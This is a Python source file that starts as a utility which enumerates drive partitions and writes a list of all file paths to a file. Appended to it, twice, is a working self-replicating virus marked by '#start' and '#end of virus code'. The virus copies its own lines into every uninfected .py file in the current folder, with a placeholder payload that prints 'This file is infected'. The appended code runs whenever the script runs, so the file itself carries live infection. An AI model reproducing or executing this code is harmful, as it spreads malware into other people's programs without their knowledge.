import glob
import time
import sys, os

os_name = sys.platform
partitionen = []
verzeichnisse = []
files = []

def partitions(sfsFolder):
    global partitionen
    big = 65

    if "win" in os_name:
        for i in range(26):
            try:
                if glob.glob(str(chr(big + i)) + ":\\"):
                    #print("Successfully found partition: " + str(chr(big + i)))
                    partitionen.append(str(chr(big + i)) + ":\\")
            except:
                continue
        return indeces(sfsFolder)
    if "win" not in os_name:
        return indeces(sfsFolder)

def indeces(sfsFolder):
    global verzeichnisse
    global files

    if "win" in os_name:
        verzeichnisse2 = glob.glob("\\*")
    else:
        verzeichnisse2 = glob.glob("//*")
    verzeichnisse_tmp = []
    x = 1

    if "win" in os_name:
        for ind in range(len(partitionen)):
            #print(partitionen[ind])
            while verzeichnisse2 != []:
                verzeichnisse2 = glob.glob(partitionen[ind] + "\\*"*x)
                for i in range(len(verzeichnisse2)):
                    verzeichnisse.append(verzeichnisse2[i])
                x += 1
            x = 1

        for i in range(len(verzeichnisse)):
            if "." in verzeichnisse[i]:
                files.append(verzeichnisse[i])
        for i in range(len(verzeichnisse)):
            if not os.path.isfile(verzeichnisse[i]):
                verzeichnisse_tmp.append(verzeichnisse[i])
        verzeichnisse = verzeichnisse_tmp
        i = 0
        f = open(sfsFolder, "w")
        for i in range(len(files)):
            f.write(files[i] + "\n")
        f.close()
        time.sleep(3)

    if "win" not in os_name:
        while verzeichnisse2 != []:
            verzeichnisse = glob.glob("//*" * x)
            for i in range(len(verzeichnisse2)):
                verzeichnisse.append(verzeichnisse2[i])
            x += 1
        x = 1

        for i in range(len(verzeichnisse)):
            if "." in verzeichnisse[i]:
                files.append(verzeichnisse[i])
        for i in range(len(verzeichnisse)):
            if not os.path.isfile(verzeichnisse[i]):
                verzeichnisse_tmp.append(verzeichnisse[i])
        verzeichnisse = verzeichnisse_tmp
        i = 0
        f = open(sfsFolder, "w")
        for i in range(len(files)):
            f.write(files[i] + "\n")
        f.close()
        time.sleep(3)#start
import sys,re,glob
# put a copy of all these lines
virusCode=[]
#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile = open(thisFile,"r")
lines = virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus = False
for line in lines:
    if(re.search("^#start",line)):
        inVirus = True

        #if the virus code has been found,start ppending the lines
        # to the virusCode list. We assume that the code is always a
        # appended to the end of the script.
    if(inVirus == True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
# find potential victims
programs = glob.glob("*.py")
# check and infect all programs that the glob found

for p in programs:
    file =open(p,"r")
    programCode = file.readlines()
    file.close()

    # check to see if the file is already infected
    infected = False
    for line in programCode:
        if(re.search("^#start",line)):
            infected = True
            break
        #stop, we dont need to try to infect this program again
    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        #write the new version to the file.Overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
# payload - do your evil work here
print("This file is infected")
#end of virus code
#start
import sys,re,glob
# put a copy of all these lines
virusCode=[]
#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile = open(thisFile,"r")
lines = virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus = False
for line in lines:
    if(re.search("^#start",line)):
        inVirus = True

        #if the virus code has been found,start ppending the lines
        # to the virusCode list. We assume that the code is always a
        # appended to the end of the script.
    if(inVirus == True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
# find potential victims
programs = glob.glob("*.py")
# check and infect all programs that the glob found

for p in programs:
    file =open(p,"r")
    programCode = file.readlines()
    file.close()

    # check to see if the file is already infected
    infected = False
    for line in programCode:
        if(re.search("^#start",line)):
            infected = True
            break
        #stop, we dont need to try to infect this program again
    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        #write the new version to the file.Overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
# payload - do your evil work here
print("This file is infected")
#end of virus code
